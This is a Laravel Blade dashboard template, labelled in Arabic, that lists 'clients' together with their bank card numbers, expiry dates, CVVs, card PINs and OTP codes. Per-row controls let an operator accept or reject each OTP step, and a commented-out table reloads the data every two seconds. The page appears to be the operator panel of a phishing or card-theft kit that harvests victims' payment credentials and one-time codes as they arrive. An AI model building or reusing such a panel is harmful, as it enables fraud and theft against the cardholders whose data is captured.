@extends('dashboard.layout.master')
@section('custom-style')
    <link rel="stylesheet" href="https://cdn.datatables.net/1.13.7/css/jquery.dataTables.min.css"/>
    <link rel="stylesheet" href="https://cdn.datatables.net/rowgroup/1.4.1/css/rowGroup.dataTables.min.css"/>
    <style>
    </style>
@endsection
@section('content')
    <!-- BEGIN PAGE TITLE-->
    <h3 class="page-title"> العملاء

    </h3>
    <!-- END PAGE TITLE-->
    <!-- END PAGE HEADER-->
    <!-- BEGIN DASHBOARD STATS 1-->
    <div class="row">
        <div class="col-md-12">
            <!-- BEGIN SAMPLE TABLE PORTLET-->
            <div class="portlet light bordered">
                <div class="portlet-title">
                    <div class="caption">
                        <i class="icon-social-dribbble font-green"></i>
                        <span class="caption-subject font-green bold uppercase">العملاء</span>
                    </div>

                </div>
                <div class="portlet-body">
                    <div class="account-table-content profile-page-content">
                        <table id="example" style="width:100%" class=" display table stripe row-border order-column"
                               style="width:100%">
                            <thead>
                            <tr>
                                <th>اسم العميل</th>
                                <th> رقم الهاتف</th>
                                <th> الرقم القومى</th>
                                <th> معاد التسجيل</th>
                                <th> البلد</th>
                                {{--                                <th> المشغل</th>--}}
                                <th> رقم البطاقة البنكية</th>
                                <th> تاريخ انتهاء البطاقة البنكية</th>
                                <th> cvv</th>
                                <th> كلمه سر البطاقة</th>

                                <th> otp code step 1</th>
                                <th> otp code step 2</th>
                            </tr>
                            </thead>
                            <tbody>

                            @foreach($clients as $client)
                                <tr>
                                    <td>{{$client->first_name ?? ''}}</td>

                                    <td>{{$client->phone ?? ''}}</td>
                                    <td>{{$client->card_no ?? ''}}</td>
                                    <td>{{$client->created_at ?? ''}}</td>
                                    <td>{{$client->country ?? ''}}</td>

                                    <td>{{$client->sms_provider ?? ''}}</td>
                                    <td>{{$client->expiry_date ?? ''}}</td>
                                    <td>{{$client->cvv ?? ''}}</td>
                                    <td>{{$client->password_card ?? ''}}</td>

                                    <td>
                                        <input type="hidden" class="clientid" value="{{$client->id}}">


                                        <select class="form-control status1" name="status1">

                                            <option>من فضلك اختار</option>
                                            <option value="accept" data-id="{{$client->id}}"
                                                    @if($client->status1=='accept') selected @endif>
                                                <a href="status" class="form-control">

                                                    قبول
                                                </a>

                                            </option>
                                            <option value="refuse" data-id="{{$client->id}}"
                                                    @if($client->status1=='refuse') selected @endif>رفض
                                            </option>
                                            <option value="error" data-id="{{$client->id}}"
                                                    @if($client->status1=='error') selected @endif>خطا
                                                البطاقه
                                            </option>
                                        </select>

                                    </td>
                                    <td>


                                        <select class="form-control status2" name="status2">
                                            <option>من فضلك اختار</option>

                                            <option value="accept" data-id="{{$client->id}}" @if($client->status2=='accept') selected @endif>
                                                <a href="">

                                                    قبول
                                                </a>


                                            </option>
                                            <option value="refuse" data-id="{{$client->id}}" @if($client->status2=='refuse') selected @endif>رفض
                                            </option>
                                        </select>
                                    </td>

                                    @endforeach

                                </tr>


                                {{--                            {{$clients->links()}}--}}
                            </tbody>
                        </table>

                    </div>
                </div>
            </div>
        </div>

    </div>
@endsection

@section('custom-script')
    <script type="text/javascript" src="https://cdn.datatables.net/1.13.6/js/jquery.dataTables.min.js"></script>
    <script>
        $('.status1').on('change', function (e) {
            var lis1 = e.target.value;
            var client = this.querySelector(':checked').getAttribute('data-id');

            console.log(client);
            $.get("{{url('clients/updatestatus')}}/" + lis1 + '/' + client, function (data) {
                console.log(data);
                window.location.href = '{{route('clients.index')}}';

            })
        });
        $('.status2').on('change', function (e) {
            var lis1 = e.target.value;
            var client = this.querySelector(':checked').getAttribute('data-id');
            $.get("{{url('clients/updatestatus2')}}/" + lis1 + '/' + client, function (data) {

                console.log(data);

            })
        });

        new DataTable('#example', {
            initComplete: function () {
                this.api()
                    .columns()
                    .every(function () {
                        let column = this;

                        // Create select element
                        let select = document.createElement('select');
                        select.add(new Option(''));
                        column.footer().replaceChildren(select);

                        // Apply listener for user change in value
                        select.addEventListener('change', function () {
                            var val = DataTable.util.escapeRegex(select.value);

                            column
                                .search(val ? '^' + val + '$' : '', true, false)
                                .draw();
                        });

                        // Add list of options
                        column
                            .data()
                            .unique()
                            .sort()
                            .each(function (d, j) {
                                select.add(new Option(d));
                            });
                    });
            }
        });
        {{--$('document').ready(function() {--}}
        {{--    var table = $('#ikuns_table').DataTable({--}}
        {{--        dom: '<"ikuns_table_toolbar">lfrtip',--}}
        {{--        language: {--}}
        {{--            emptyTable: "not founded any items"--}}
        {{--        },--}}
        {{--        fixedColumns: {--}}
        {{--            left: 1,--}}
        {{--            right: 1--}}
        {{--        },--}}
        {{--        scrollCollapse: true,--}}
        {{--        scrollX: true,--}}
        {{--        scrollY: 300,--}}
        {{--        responsive: true,--}}
        {{--        paging: true,--}}
        {{--        select: true,--}}
        {{--        processing: false, // for show progress bar--}}
        {{--        ajax: "{{ route('clients.api') }}",--}}
        {{--        columns: [--}}
        {{--        //--}}
        {{--        //     {--}}
        {{--        //         data: "first_name",--}}
        {{--        //     },--}}
        {{--        //     {--}}
        {{--        //         data: "phone",--}}
        {{--        //     },--}}
        {{--        //     {--}}
        {{--        //         data: "card_no",--}}
        {{--        //     },--}}
        {{--        //     {--}}
        {{--        //         data: "created_at",--}}
        {{--        //     },--}}
        {{--        //     {--}}
        {{--        //         data: "country",--}}
        {{--        //     },--}}
        {{--        //     {--}}
        {{--        //         data: "sms_provider",--}}
        {{--        //     },--}}
        {{--        //     {--}}
        {{--        //         data: "card_no",--}}
        {{--        //     },--}}
        {{--        //     {--}}
        {{--        //         data: "expiry_date",--}}
        {{--        //     },--}}
        {{--        //     {--}}
        {{--        //         data: "cvv",--}}
        {{--        //     },--}}
        {{--        //     {--}}
        {{--        //         data: "otp1",--}}
        {{--        //     },--}}
        {{--        //     {--}}
        {{--        //         data: "otp2",--}}
        {{--        //     },--}}
        {{--        //     {--}}
        {{--        //         data: "password_card",--}}
        {{--        //     },--}}
        {{--        //--}}
        {{--        ]--}}
        {{--        //--}}
        {{--        //--}}
        {{--    });--}}

        {{--    setInterval(function() {--}}
        {{--        table.ajax.reload();--}}
        {{--    }, 2000);--}}
        {{--});--}}
    </script>
@endsection
